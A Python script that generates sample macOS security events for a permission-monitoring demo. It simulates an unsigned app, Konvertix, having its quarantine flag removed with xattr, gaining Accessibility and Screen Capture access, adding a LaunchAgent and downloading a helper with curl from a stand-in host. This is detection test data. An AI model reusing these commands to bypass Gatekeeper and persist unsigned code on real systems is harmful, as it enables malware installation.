"""Demo senaryosunu permwatch CLI'ının JSON Lines formatında üretir.

Kullanım: python3 -I app/tools/make_sample.py > app/Resources/sample-events.jsonl
"""
import datetime
import hashlib
import json
import zoneinfo

TZ = zoneinfo.ZoneInfo("Europe/Istanbul")
HOME = "/Users/demo"
KVX = f"{HOME}/Downloads/Konvertix.app"
KVX_BIN = f"{KVX}/Contents/MacOS/Konvertix"
HELPER = f"{HOME}/Library/Application Support/.kvx/helper"
FLAGS = {"apple": "0x32002201", "developer": "0x32010301", "adhoc": "0x22000002", "unsigned": "0x00000000"}


def ts(s):
    return round(datetime.datetime.fromisoformat(s).replace(tzinfo=TZ).timestamp(), 9)


def proc(pid, path, sig, ppid=1, team=None, sid=None):
    cdhash = hashlib.sha1(path.encode()).hexdigest() if sig != "unsigned" else None
    return {"pid": pid, "ppid": ppid, "uid": 501, "responsible_pid": pid, "path": path,
            "signing_id": sid, "team_id": team, "signature": sig, "cs_flags": FLAGS[sig], "cdhash": cdhash}


LAUNCHD = proc(1, "/sbin/launchd", "apple", ppid=0, sid="com.apple.xpc.launchd")
TCCD = proc(188, "/System/Library/PrivateFrameworks/TCC.framework/Support/tccd", "apple", sid="com.apple.tccd")
BTMD = proc(412, "/System/Library/PrivateFrameworks/BackgroundTaskManagement.framework/Versions/A/Resources/backgroundtaskmanagementd",
            "apple", sid="com.apple.backgroundtaskmanagementd")
ZSH = proc(5120, "/bin/zsh", "apple", ppid=5119, sid="com.apple.zsh")
ZOOM = proc(2210, "/Applications/zoom.us.app/Contents/MacOS/zoom.us", "developer", team="BJ4HAAB9B3", sid="us.zoom.xos")
SLACK = proc(2301, "/Applications/Slack.app/Contents/MacOS/Slack", "developer", team="BQR82RBBHL", sid="com.tinyspeck.slackmacgap")
KONV = proc(6013, KVX_BIN, "unsigned")
HT_BIN = f"{HOME}/Library/Application Support/HelperTool/HelperTool"
HT = proc(3301, HT_BIN, "adhoc", sid="HelperTool-55554944")
SETTINGS = proc(4401, "/System/Applications/System Settings.app/Contents/MacOS/System Settings", "apple",
                sid="com.apple.systempreferences")

events = []


def ev(when, kind, process, **kw):
    events.append({"ts": ts(when), "event": kind, "process": process, **kw})


def tcc(when, service, identity, itype, reason, responsible, instigator=TCCD):
    ev(when, "tcc_modify", TCCD, service=service, identity=identity, identity_type=itype,
       update="create", right="allowed", reason=reason, instigator=instigator, responsible=responsible)


# 4 Kasım: ad-hoc imzalı bir yardımcı araç Belgeler klasörüne erişiyor.
ev("2026-11-04T11:05:10", "exec", LAUNCHD, target=HT, argv=[HT_BIN], lolbin=False)
tcc("2026-11-04T11:06:02", "kTCCServiceSystemPolicyDocumentsFolder", HT_BIN, "executable_path", "user_consent", HT)

# 7 Kasım
tcc("2026-11-07T09:14:22", "kTCCServiceMicrophone", "us.zoom.xos", "bundle_id", "user_consent", ZOOM)
ev("2026-11-07T10:02:05", "btm_launch_item_add", BTMD,
   item={"type": "login_item", "legacy": False, "managed": False, "uid": 501,
         "url": "file:///Applications/Slack.app/", "app_url": "file:///Applications/Slack.app/"},
   executable_path=None, instigator=SLACK, app=SLACK)
ev("2026-11-07T13:46:30", "exec", ZSH, target=proc(6001, "/usr/bin/xattr", "apple", ppid=5120, sid="com.apple.xattr"),
   argv=["xattr", "-d", "com.apple.quarantine", KVX], lolbin=True)
ev("2026-11-07T13:46:31", "quarantine_removed", proc(6001, "/usr/bin/xattr", "apple", ppid=5120, sid="com.apple.xattr"),
   target=KVX)
ev("2026-11-07T13:47:02", "exec", LAUNCHD, target=KONV, argv=[KVX_BIN], lolbin=False)
tcc("2026-11-07T13:48:10", "kTCCServiceAccessibility", KVX_BIN, "executable_path", "user_consent", KONV)
tcc("2026-11-07T13:48:41", "kTCCServiceScreenCapture", KVX_BIN, "executable_path", "user_consent", KONV)
ev("2026-11-07T13:49:06", "btm_launch_item_add", BTMD,
   item={"type": "agent", "legacy": True, "managed": False, "uid": 501,
         "url": f"file://{HOME}/Library/LaunchAgents/com.konvertix.helper.plist", "app_url": None},
   executable_path=HELPER, instigator=KONV, app=None)
ev("2026-11-07T13:49:30", "exec", KONV, target=proc(6044, "/usr/bin/curl", "apple", ppid=6013, sid="com.apple.curl"),
   argv=["curl", "-fsSL", "https://cdn.konvertix.example/helper", "-o", HELPER], lolbin=True)
tcc("2026-11-07T18:20:13", "kTCCServiceSystemPolicyAllFiles", "com.apple.Terminal", "bundle_id", "user_set", None,
    instigator=SETTINGS)

# 8 Kasım, gece
ev("2026-11-08T03:12:44", "exec", LAUNCHD, target=proc(7102, HELPER, "unsigned"), argv=[HELPER], lolbin=False)

for e in events:
    print(json.dumps(e, ensure_ascii=False, separators=(",", ":")))
